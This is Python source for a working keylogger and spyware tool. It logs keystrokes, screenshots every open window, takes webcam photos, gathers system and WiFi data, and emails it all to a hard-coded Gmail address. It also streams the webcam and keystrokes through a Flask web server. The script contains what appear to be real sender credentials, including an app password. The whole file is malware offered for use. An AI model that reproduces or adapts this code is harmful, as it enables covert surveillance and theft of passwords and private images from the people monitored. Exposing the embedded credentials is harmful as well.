#This version requirs the index.html and needs to be in the same dir.

from pynput.keyboard import Key, Listener
import logging
import smtplib
import schedule
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import pygetwindow as gw
import pyautogui
import cv2
import os
import psutil
import platform
import subprocess
import speedtest
import socket
from flask import Flask, render_template, Response
from threading import Thread
from flask import jsonify

app = Flask(__name__, template_folder=os.path.dirname(os.path.realpath(__file__)))

desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
log_dir = os.path.join(desktop_path, "KeyLoggerLogs")

os.makedirs(log_dir, exist_ok=True)

# Email configuration
sender_email = "logger123445@gmail.com"
receiver_email = "jeandre7803@gmail.com"
email_password = "nzvyakgbwyrjznuh"
smtp_server = "smtp.gmail.com"
smtp_port = 587

# Logging configuration
logging.basicConfig(filename=(os.path.join(log_dir, "key_log.txt")), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Variable to store live keystrokes
live_keystrokes = ""
max_keystrokes_display = 500  # Adjust the maximum number of characters to display

def on_press(key):
    global live_keystrokes
    if key == Key.ctrl_l or key == Key.ctrl_r:
        return
    elif key == Key.esc:
        return False
    else:
        logging.info(str(key))
        live_keystrokes = str(key)

        # Truncate the live_keystrokes if it exceeds the maximum limit
        live_keystrokes = live_keystrokes[-max_keystrokes_display:]

# Function to continuously listen for keyboard events
def start_key_listener():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Start the key listener in a separate thread
key_listener_thread = Thread(target=start_key_listener)
key_listener_thread.start()

def take_webcam_picture():
    print("Turning on webcam and allowing it to adjust...")
    cap = cv2.VideoCapture(0)  # 0 for built-in camera, 1 for USB

    time.sleep(5)

    print("Capturing picture from webcam...")

    ret, frame = cap.read()
    cap.release()

    webcam_picture_path = os.path.join(log_dir, "webcam_picture.jpg")
    cv2.imwrite(webcam_picture_path, frame)

    print(f"Webcam picture saved: {webcam_picture_path}")
    return webcam_picture_path

def get_system_info():
    st = speedtest.Speedtest()
    st.get_best_server()
    download_speed = st.download() / 1024 / 1024
    upload_speed = st.upload() / 1024 / 1024
    ping = st.results.ping

    local_ip = socket.gethostbyname(socket.gethostname())
    public_ip = subprocess.check_output(["curl", "-s", "https://api64.ipify.org"]).decode("utf-8").strip()

    system_info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Architecture": platform.architecture(),
        "Processor": platform.processor(),
        "RAM": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
        "CPU Usage": f"{psutil.cpu_percent()}%",
        "Disk Usage": f"{psutil.disk_usage('/').percent}%",
        "Available Storage": f"{psutil.disk_usage('/').free / (1024 ** 3):.2f} GB",
        "Internet Speed": f"Download: {download_speed:.2f} Mbps, Upload: {upload_speed:.2f} Mbps",
        "Ping": f"{ping} ms",
        "WiFi Info": get_wifi_info(),
        "Local IP": local_ip,
        "Public IP": public_ip,
    }
    return system_info

def get_wifi_info():
    try:
        wifi_info = subprocess.check_output(["netsh", "wlan", "show", "interfaces"]).decode("utf-8")
        return wifi_info
    except subprocess.CalledProcessError as e:
        return f"Error retrieving WiFi info: {e}"

def send_email():
    print("Sending email...")

    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "Keys Logged, Screenshots, and Webcam Picture on Desktop"
    message.attach(MIMEText("Find the logfile, screenshots, and webcam picture within"))

    system_info = get_system_info()
    system_info_text = "\n".join([f"{key}: {value}" for key, value in system_info.items()])
    message.attach(MIMEText(f"\n\nSystem Information:\n\n{system_info_text}\n\n", 'plain'))

    with open(os.path.join(log_dir, "key_log.txt"), "rb") as file:
        attachment = MIMEBase("application", "octet-stream")
        attachment.set_payload(file.read())
        encoders.encode_base64(attachment)
        attachment.add_header("Content-Disposition", "attachment", filename="key_log.txt")
        message.attach(attachment)

    for i, window in enumerate(gw.getAllTitles()):
        screenshot = pyautogui.screenshot(region=(gw.getWindowsWithTitle(window)[0].left,
                                                  gw.getWindowsWithTitle(window)[0].top,
                                                  gw.getWindowsWithTitle(window)[0].width,
                                                  gw.getWindowsWithTitle(window)[0].height))
        screenshot_path = os.path.join(log_dir, f"screenshot_{i+1}.png")
        screenshot.save(screenshot_path)

        with open(screenshot_path, "rb") as screenshot_file:
            screenshot_attachment = MIMEBase("application", "octet-stream")
            screenshot_attachment.set_payload(screenshot_file.read())
            encoders.encode_base64(screenshot_attachment)
            screenshot_attachment.add_header("Content-Disposition", "attachment", filename=f"screenshot_{i+1}.png")
            message.attach(screenshot_attachment)

    webcam_picture_path = take_webcam_picture()
    with open(webcam_picture_path, "rb") as webcam_picture_file:
        webcam_attachment = MIMEBase("application", "octet-stream")
        webcam_attachment.set_payload(webcam_picture_file.read())
        encoders.encode_base64(webcam_attachment)
        webcam_attachment.add_header("Content-Disposition", "attachment", filename="webcam_picture.jpg")
        message.attach(webcam_attachment)

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(sender_email, email_password)
            server.send_message(message)
        print("Email sent successfully.")
    except smtplib.SMTPAuthenticationError:
        print("Failed to log in to SMTP. Check your email credentials.")
    except Exception as e:
        print(f"Error sending email: {e}")

def generate_frames():
    cap = cv2.VideoCapture(1)  # 0 for built-in camera, 1 for USB

    while True:
        ret, frame = cap.read()
        if not ret:
            break

        # Encode the frame in JPEG format
        _, buffer = cv2.imencode('.jpg', frame)
        frame_bytes = buffer.tobytes()

        # Yield the frame in the response
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n')

    # Release the webcam when the generator is finished
    cap.release()

@app.route('/')
def index():
    return render_template('index.html', system_info=get_system_info(), wifi_info=get_wifi_info(), live_keystrokes=live_keystrokes)

@app.route('/video_feed')
def video_feed():
    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
@app.route('/keystrokes_feed')
def keystrokes_feed():
    global live_keystrokes
    return jsonify({"data": live_keystrokes})

if __name__ == '__main__':
    # Start the Flask web server
    app.run(debug=True)
